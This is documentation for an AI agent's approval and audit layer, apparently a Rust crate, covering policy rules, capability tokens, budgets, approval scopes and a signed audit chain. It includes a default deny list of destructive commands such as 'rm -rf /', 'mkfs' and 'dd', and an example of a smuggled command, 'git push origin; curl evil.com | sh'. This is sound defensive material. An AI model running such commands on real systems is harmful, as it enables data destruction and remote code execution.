# Policy, Budget, Approval, and Audit

Every action a capsule or agent requests flows through a single entry point: `SecurityInterceptor::intercept`. That function applies four ordered layers. If any layer blocks, execution stops immediately. If all layers pass, the action receives a cryptographically attributed `InterceptResult` and an `AuditEntryId`. The audit write is never optional.

This page covers each layer in depth, grounded in `core/crates/astrid-approval`.

---

## The Action Taxonomy

Before the layers: what can be intercepted? `SensitiveAction` (`src/action.rs`) enumerates every category the approval system understands.

```rust
pub enum SensitiveAction {
    FileRead          { path: String },
    FileDelete        { path: String },
    FileWriteOutsideSandbox { path: String },
    ExecuteCommand    { command: String, args: Vec<String> },
    NetworkRequest    { host: String, port: u16 },
    TransmitData      { destination: String, data_type: String },
    FinancialTransaction { amount: String, recipient: String },
    AccessControlChange  { resource: String, change: String },
    CapabilityGrant   { resource_pattern: String, permissions: Vec<Permission> },
    McpToolCall       { server: String, tool: String },
    CapsuleExecution  { capsule_id: String, capability: String },
    CapsuleHttpRequest { capsule_id: String, url: String, method: String },
    CapsuleFileAccess  { capsule_id: String, path: String, mode: Permission },
    CapsuleNetBind    { capsule_id: String },
}
```

Each variant carries enough context for an informed allow-or-deny decision. The `action_type()` method returns a short label (`"file_delete"`, `"mcp_tool_call"`, etc.) used in audit records. `summary()` returns a human-readable description for the approval prompt.

---

## Layer 1: SecurityPolicy (Hard Boundaries)

`SecurityPolicy` (`src/policy.rs`) is the admin-configured layer. It produces one of three outcomes, in this exact priority order:

```rust
pub enum PolicyResult {
    Allowed,
    RequiresApproval(RiskAssessment),
    Blocked { reason: String },
}
```

A `Blocked` result is final. The interceptor converts it immediately to `ApprovalError::PolicyBlocked` and writes a denial audit entry. The action never reaches the approval manager or the user.

### The eight-step check order

The `check` method dispatches on the action variant and applies checks in a documented order (`src/policy.rs`, lines 9-16):

1. Is the tool in `blocked_tools`? Blocks `ExecuteCommand` by name (or `"command arg"` prefix) and `McpToolCall` by `"server:tool"`, by server name alone, or by tool name alone.
2. Does the path match a `denied_paths` glob? Blocks all file operations on matching paths.
3. Is the host in `denied_hosts`? Blocks `NetworkRequest` and `TransmitData`.
4. Does the argument total exceed `max_argument_size`? Blocks `ExecuteCommand` with oversized arguments.
5. Is the tool in `approval_required_tools`? Escalates to `RequiresApproval`.
6. Is `require_approval_for_delete` set and the action a file delete? Escalates.
7. Is `require_approval_for_network` set and the action a network request? Escalates.
8. Otherwise: `Allowed`.

Three action categories are unconditional `RequiresApproval` regardless of policy fields: `FinancialTransaction`, `AccessControlChange`, and `CapabilityGrant`. They cannot be made `Allowed` by any policy setting.

### Allowed paths and allowed hosts

`allowed_paths` and `allowed_hosts` are allowlists. When non-empty, any path or host not on the list is `Blocked`. When empty, the check is skipped entirely. The denied list is always checked first, so a path on both lists is blocked.

Path traversal sequences (`..`) are caught by `std::path::Path::components()` before any glob check. This applies to both `SecurityPolicy::check_file_path` and the allowance pattern matcher.

### The default policy

`SecurityPolicy::default()` ships with:

- `blocked_tools`: `rm -rf /`, `rm -rf /*`, `sudo`, `su`, `mkfs`, `dd`, `chmod 777`, `shutdown`, `reboot`, `init`
- `denied_paths`: `/etc/**`, `/boot/**`, `/sys/**`, `/proc/**`, `/dev/**`
- `approval_required_tools`: `builtin:task`
- `max_argument_size`: 1 MiB
- `require_approval_for_delete`: `true`
- `require_approval_for_network`: `true`

`SecurityPolicy::permissive()` clears everything. It is intended for tests, never production.

### Capsule policy

Capsule actions run through `check_capsule_action`. The check order is:

1. Is the `capsule_id` in `blocked_capsules`? Blocked, regardless of action type.
2. For `CapsuleHttpRequest`: is the URL's host in `denied_hosts`? Blocked.
3. For `CapsuleFileAccess`: does the path match `denied_paths`? Blocked.
4. Otherwise: `RequiresApproval`. Capsule actions are never `Allowed` by policy alone.

`CapsuleNetBind` has no path-based policy check because the socket is pre-bound by the kernel. The manifest capability gate enforces the bind right; policy gates approval for the capsule itself.

---

## Layer 2: Capability Tokens

If policy does not block, the interceptor checks for an existing capability token (`src/interceptor/capability.rs`). A matching, valid, trusted token short-circuits the approval flow entirely.

### Principal scope

Tokens are scoped to the `PrincipalId` that received them. The store uses `(principal, resource, permission)` as the lookup key. Agent A's token cannot authorise Agent B's invocation even when the resource pattern matches. This is enforced by `CapabilityValidator::check_capability`, which passes the invoking principal to `validator.check(principal, &resource, permission)`.

### Issuer trust

Only tokens signed by the runtime key are accepted. The validator is constructed with `.trust_issuer(trusted_key)`. After `store.use_token()` returns the consumed token, the issuer is verified a second time against the runtime key. This is a TOCTOU defense: `use_token` checks expiry and signature but not issuer trust.

### Single-use consumption

Single-use tokens are consumed atomically via `store.use_token()` before the audit write. If the audit write subsequently fails (fail-closed), the token is gone and the action is denied. This is the correct trade-off: a transient audit failure is recoverable by re-approval; a replayed single-use token is not.

### Resource mapping

`action_to_resource_permission` maps each `SensitiveAction` variant to a `(resource_str, Permission)` pair:

| Action | Resource | Permission |
|--------|----------|-----------|
| `McpToolCall { server, tool }` | `mcp://server:tool` | `Invoke` |
| `FileRead { path }` | `file://path` | `Read` |
| `FileDelete { path }` | `file://path` | `Delete` |
| `FileWriteOutsideSandbox { path }` | `file://path` | `Write` |
| `ExecuteCommand { command, .. }` | `exec://command` | `Execute` |
| `NetworkRequest { host, port }` | `net://host:port` | `Invoke` |
| `CapsuleExecution { capsule_id, capability }` | `capsule://capsule_id:capability` | `Invoke` |
| `CapsuleHttpRequest { capsule_id, .. }` | `capsule://capsule_id:http_request` | `Invoke` |
| `CapsuleFileAccess { capsule_id, mode, .. }` | `capsule://capsule_id:file_{read\|write\|delete}` | `Invoke` |

Actions that do not map (e.g., `FinancialTransaction`, `TransmitData`) return `None`, which means they can never be authorised by a capability token and always go through the approval flow.

---

## Layer 3: The Dual Budget

Budget enforcement (`src/budget.rs`, `src/interceptor/budget.rs`) runs after capability checks, before user approval. It operates across two independent trackers that must both pass.

### BudgetConfig

```rust
pub struct BudgetConfig {
    pub session_max_usd: f64,
    pub per_action_max_usd: f64,
    pub warn_at_percent: u8,   // default 80
}
```

The default is $100 session max, $10 per-action max, warn at 80%.

### BudgetResult

```rust
pub enum BudgetResult {
    Allowed,
    WarnAndAllow { current_spend: f64, session_max: f64, percent_used: f64 },
    Exceeded    { reason: ExceededReason, requested: f64, available: f64 },
}
```

`is_allowed()` returns `true` for both `Allowed` and `WarnAndAllow`. Only `Exceeded` blocks.

`ExceededReason` is `PerActionLimit`, `SessionBudget`, or `WorkspaceBudget`. The per-action check runs first, before any lock is acquired, because the config is immutable.

### Atomic reservation

`check_and_reserve` on `BudgetTracker` takes a write lock, checks remaining budget, and writes the reservation in a single critical section. This prevents two concurrent callers from both passing the read-only check and then both recording costs, which would overspend the budget. The same pattern applies to `WorkspaceBudgetTracker::check_and_reserve`.

### RAII refund with BudgetReservation

`BudgetValidator::check_and_reserve` returns a `BudgetReservation`. The reservation holds the cost and two tracker references. If the `BudgetReservation` is dropped without calling `.commit()`, its `Drop` impl calls `refund_cost` on both trackers (`src/interceptor/budget.rs`, lines 32-38):

```rust
impl Drop for BudgetReservation {
    fn drop(&mut self) {
        if !self.committed {
            if let Some(ref ws_budget) = self.workspace_tracker {
                ws_budget.refund_cost(self.cost);
            }
            self.tracker.refund_cost(self.cost);
        }
    }
}
```

`commit()` consumes the `BudgetReservation` and sets `committed = true`, preventing the drop refund. The interceptor calls `res.commit()` only after the audit write succeeds. If the audit write fails, the reservation drops and the cost is refunded.

### Workspace budget

`WorkspaceBudgetTracker` tracks cumulative spend across sessions. Its `max_usd` field is `Option<f64>`: when `None`, the tracker records spend for reporting but never blocks. Both trackers are checked by `BudgetValidator::check_and_reserve`, which pre-checks both without reserving, then reserves both with a workspace-then-session order and an explicit rollback if the session reservation fails after the workspace reservation has already committed.

`record_cost` and `refund_cost` on both trackers reject negative, `NaN`, and infinite values silently. `BudgetTracker::restore` and `WorkspaceBudgetTracker::restore` clamp the loaded spend to `max(0.0, value)` and treat non-finite values as zero, preventing budget manipulation through tampered snapshots.

### Warning surface

When `check_and_reserve` returns `BudgetResult::WarnAndAllow`, the interceptor stores the warning in `InterceptResult::budget_warning: Option<BudgetWarning>`. The caller is responsible for surfacing it to the user. The action still proceeds.

---

## Layer 4: The Approval Decision Ladder

When policy returns `RequiresApproval` and no capability token matches, the interceptor calls `ApprovalManager::check_approval` (`src/manager.rs`).

### Allowance store check

The first thing `check_approval` does is call `allowance_store.find_matching_and_consume(principal, action, workspace_root)`. If a matching, valid allowance exists for the invoking principal, it is consumed atomically and `ApprovalOutcome::Allowed { proof: ApprovalProof::Allowance { .. } }` is returned without contacting the user. This is the fast path for actions covered by a previous decision.

### ApprovalHandler trait

If no allowance matches, the manager delegates to the registered `ApprovalHandler`:

```rust
#[async_trait]
pub trait ApprovalHandler: Send + Sync {
    async fn request_approval(&self, request: ApprovalRequest) -> Option<ApprovalResponse>;
    fn is_available(&self) -> bool;
}
```

Different frontends (CLI, Discord, web) implement this trait. `is_available()` is checked before sending the request. If the handler is not registered, or `is_available()` returns `false`, or the response times out (default: 5 minutes), the action is deferred rather than denied.

### The five approval decisions

`ApprovalDecision` (`src/request.rs`) encodes what the user chose:

```rust
pub enum ApprovalDecision {
    Approve,                              // once
    ApproveSession,                       // session-scoped allowance
    ApproveWorkspace,                     // workspace-scoped allowance
    ApproveAlways,                        // persistent capability token (1h TTL)
    ApproveWithAllowance(Box<Allowance>), // custom allowance from handler
    Deny { reason: String },
}
```

**`Approve` (Once):** One-time. No allowance is stored. The interceptor records `InterceptProof::UserApproval` with the `AuditEntryId` of the approval event. The next identical action requires fresh approval.

**`ApproveSession` (Session):** Creates a session-scoped `Allowance` (`session_only: true`). The `AllowanceStore` holds it in memory. It is cleared at session end. Future requests matching the same action pattern are auto-approved without prompting, until the session ends or the allowance expires.

**`ApproveWorkspace` (Workspace):** Creates a non-session allowance (`session_only: false`) scoped to the current workspace root. It survives session end but only matches when the runtime is operating in the same workspace directory. The `workspace_root` field on `Allowance` enforces this: the store checks that the action's path starts with the allowance's `workspace_root`.

**`ApproveAlways` (Always):** Creates a persistent `CapabilityToken` with a 1-hour TTL (`ALLOW_ALWAYS_DEFAULT_TTL`, `src/interceptor/types.rs`, line 6). The token is signed by the runtime key, stored in the `CapabilityStore`, and carries an `approval_audit_id` chain-link to the approval event. Future requests matching the same action go through the capability layer (Layer 2), bypassing the approval manager entirely until the token expires. If token creation fails (storage error), the interceptor falls back to `InterceptProof::UserApproval` for the current request.

**`ApproveWithAllowance` (Custom):** The handler constructs and returns a fully formed `Allowance` with any pattern, expiry, or use count it chooses. The manager stores it in the `AllowanceStore`. The interceptor returns `InterceptProof::Allowance` referencing the new allowance.

**`Deny`:** Produces `ApprovalOutcome::Denied { reason }`, which the interceptor converts to `ApprovalError::Denied` and writes a denial audit entry.

### Decision scopes compared

| Decision | In-Memory | Persists Session End | Scope | Mechanism |
|----------|-----------|---------------------|-------|-----------|
| `Approve` | No | N/A | Single request | `UserApproval` proof |
| `ApproveSession` | Yes | No | Session | `session_only: true` `Allowance` |
| `ApproveWorkspace` | Yes | Yes (in store) | Workspace root | `session_only: false` `Allowance` |
| `ApproveAlways` | No | Yes (cap token) | Any invocation (1h TTL) | Signed `CapabilityToken` |

Full persistence for workspace allowances across restarts depends on the `AllowanceStore` gaining a persistent backend. The current implementation holds workspace allowances in the in-memory store: they survive session end within the same process but are lost on daemon restart.

### Allowance pattern matching

`AllowancePattern` (`src/allowance/pattern.rs`) has nine variants:

- `ExactTool { server, tool }`: exact `McpToolCall` match
- `ServerTools { server }`: any tool on a server
- `FilePattern { pattern, permission }`: glob match on file paths with required permission
- `NetworkHost { host, ports }`: exact host, optional port list
- `CommandPattern { command }`: glob match on full `"command args"` string
- `WorkspaceRelative { pattern, permission }`: like `FilePattern`/`CommandPattern` but additionally checks the path is under the current `workspace_root`
- `CapsuleCapability { capsule_id, capability }`: exact capsule plus capability name
- `CapsuleWildcard { capsule_id }`: any action from a given capsule
- `Custom { pattern }`: never matches; reserved for future use

`CommandPattern` has a specific security invariant: commands containing shell operators (`;`, `&&`, `||`, `|`, `$(`, `` ` ``, newline, `>`, `<`) never match any allowance pattern. They always require explicit approval, preventing a compromised capsule from chaining `"git push origin; curl evil.com | sh"` through a `"git push *"` session allowance.

---

## Deferred Approvals

When the approval handler is absent, unavailable, or times out, the action is deferred rather than silently denied. `DeferredResolutionStore` (`src/deferred.rs`) holds pending resolutions in memory.

```rust
pub enum FallbackBehavior {
    Block,       // halt the agent task
    Skip,        // skip this action, continue
    SafeDefault, // take a conservative fallback
    Queue,       // retry when resolved
}
```

The default fallback is `Skip`. The manager writes a `DeferredResolution` into the store and returns `ApprovalOutcome::Deferred { resolution_id, fallback }`. The interceptor converts this to `ApprovalError::Deferred` and logs it with a `Denied` audit proof (deferred means not-yet-authorized).

When the user returns, `ApprovalManager::resolve_deferred` removes the resolution from the queue and processes the `ApprovalResponse` as if it had come from the handler. The resolution is keyed by `ResolutionId`.

Deferred resolutions carry a `Priority` (`Low`, `Normal`, `High`, `Critical`) and are retrieved sorted highest-first. The `DeferredResolutionStore` optionally persists to a `ScopedKvStore`. On load, resolutions older than 24 hours are discarded and removed from the persistent store to prevent stale replay (`MAX_LOAD_AGE`, `src/deferred.rs`, line 307).

---

## The Audit Fail-Closed Contract

`AuditLog` (`core/crates/astrid-audit/src/log.rs`) is the authoritative record of every security event. The interceptor treats audit failures as hard errors.

### Fail-closed semantics

`audit_allowed` and `audit_denied` both propagate `AuditError` as `ApprovalError::AuditFailed`. The `ApprovalError` variants make this explicit in the error message: `"audit failed (fail-closed): ..."` (`src/error.rs`, line 42). An action is not considered permitted unless it has an audit entry. If `AuditLog::append` returns an error, the interceptor returns an error to the caller and the action does not proceed.

This is a deliberate asymmetry with the admin API router, which is fail-open by design: admin routing failures degrade gracefully. The audit trail has the opposite requirement: an incomplete audit trail is worse than a denied action.

### Chain structure

Each `AuditEntry` contains:

- `id`: a random `AuditEntryId`
- `session_id` and optional `principal`
- `action: AuditAction`, `authorization: AuthorizationProof`, `outcome: AuditOutcome`
- `previous_hash: ContentHash`: hash of the preceding entry in this chain
- `runtime_key: PublicKey`: the key that signed this entry
- `signature: Signature`: ed25519 signature over all of the above

Each principal maintains its own independent chain within a session. System entries (no principal) form a separate chain. The chain key is `(SessionId, Option<PrincipalId>)`. Chain integrity is verifiable: `entry.follows(previous)` checks that `entry.previous_hash == previous.content_hash()`.

The signing payload includes the principal with a length-delimited encoding (presence byte + 4-byte length + bytes) to prevent ambiguity between a present empty principal and the absent case.

### Authorization proof variants

The `AuthorizationProof` recorded in each entry describes how the action was authorised:

| Proof | When written |
|-------|-------------|
| `Capability { token_id, token_hash }` | Layer 2 fast path |
| `UserApproval { user_id, approval_entry_id }` | `ApproveAlways` and `Approve` decisions |
| `NotRequired { reason }` | Policy-`Allowed` actions; allowance-based decisions |
| `Denied { reason }` | Policy blocks; user deny; deferred actions |

`ApproveAlways` decisions record the approval `AuditEntryId` in the minted `CapabilityToken` as `approval_audit_id`. Future requests authorised by that token carry a `UserApproval` proof with `approval_entry_id: Some(approval_audit_id)`, creating a chain-link between the approval event and all future invocations it covers.

### What the audit log records

`sensitive_action_to_audit` (`src/interceptor/audit.rs`) converts each `SensitiveAction` variant to an `AuditAction`. MCP tool calls and file operations map to dedicated `AuditAction` variants. All other sensitive actions map to `AuditAction::ApprovalRequested { action_type, resource }`, which records the action type label and a human-readable resource string. Arguments are not recorded; argument content hashes are used where applicable to preserve privacy.

---

## Full Intercept Flow

The five-step flow in `SecurityInterceptor::intercept` (`src/interceptor/mod.rs`, lines 113-343):

```
intercept(principal, action, context, estimated_cost)
  │
  ├─ Step 1: policy.check(action)
  │     Blocked  ─────────────────────────────────────► audit_denied ──► Err(PolicyBlocked)
  │     Allowed/RequiresApproval
  │
  ├─ Step 2: capability_validator.check_capability(principal, action)
  │     Found  ──► budget check ──► audit_allowed ──► commit ──► Ok(InterceptResult)
  │                  Exceeded ──────────────────────► audit_denied ──► Err(Denied)
  │     None
  │
  ├─ Step 3: budget_validator.check_and_reserve(estimated_cost)
  │     Exceeded ─────────────────────────────────────► audit_denied ──► Err(Denied)
  │     Ok(reservation) [warning captured if WarnAndAllow]
  │
  ├─ Step 4: if PolicyResult::Allowed ──► audit_allowed ──► commit ──► Ok(InterceptResult)
  │          else approval_manager.check_approval(...)
  │
  └─ Step 5: match ApprovalOutcome
        Allowed { OneTimeApproval }     ─► audit_allowed ─► commit ─► Ok(UserApproval proof)
        Allowed { SessionApproval }     ─► audit_allowed ─► create session allowance
        Allowed { WorkspaceApproval }   ─► audit_allowed ─► create workspace allowance
        Allowed { AlwaysAllow }         ─► audit_allowed ─► mint CapabilityToken
        Allowed { Allowance/Custom }    ─► audit_allowed ─► commit ─► Ok(Allowance proof)
        Denied                          ─► audit_denied  ─► Err(Denied)
        Deferred                        ─► audit_deferred ─► Err(Deferred)
```

For the capability fast path and the policy-Allowed path, the audit write is issued before `res.commit()`, so a failed audit leaves the budget unspent and the reservation is dropped and refunded. For approval-based outcomes (`ApprovalOutcome::Allowed`), the code calls `res.commit()` before the audit write; a failed audit in those paths leaves the budget already consumed and not refunded. If the capability token is consumed but the audit write fails, the action is denied and the token is not restored. This prevents replay at the cost of a single audit-failure event requiring re-approval.

---

## Writing an ApprovalHandler

Any frontend that wants to present approval prompts implements `ApprovalHandler`:

```rust
use astrid_approval::manager::{ApprovalHandler, ApprovalProof};
use astrid_approval::request::{ApprovalDecision, ApprovalRequest, ApprovalResponse};
use async_trait::async_trait;

struct MyHandler;

#[async_trait]
impl ApprovalHandler for MyHandler {
    async fn request_approval(&self, request: ApprovalRequest) -> Option<ApprovalResponse> {
        // request.action is the SensitiveAction
        // request.assessment.reason explains why it requires approval
        // request.context is what the agent was trying to accomplish

        // Returning None defers the action.
        // Returning Some(response) with Deny blocks it.
        // Returning Some(response) with any Approve variant proceeds.

        let decision = ApprovalDecision::ApproveSession;
        Some(ApprovalResponse::new(request.id, decision))
    }

    fn is_available(&self) -> bool {
        true
    }
}
```

Register the handler with `approval_manager.register_handler(Arc::new(MyHandler)).await`. The manager holds the handler behind an `RwLock<Option<Arc<dyn ApprovalHandler>>>`, so handlers can be swapped at runtime.

`ApprovalResponse::with_signature(sig)` attaches a user signature for non-repudiation in the audit trail. The signature is stored on the response but the current interceptor does not yet verify it. The field is reserved for a future step that will include it in the audit proof.

## See also

- [The Five-Layer Security Gate](five-layer-gate.md)
- [Capabilities, Tokens, and Delegation](capabilities-and-tokens.md)
- [The Cryptographic Audit Chain](../storage/audit-chain.md)
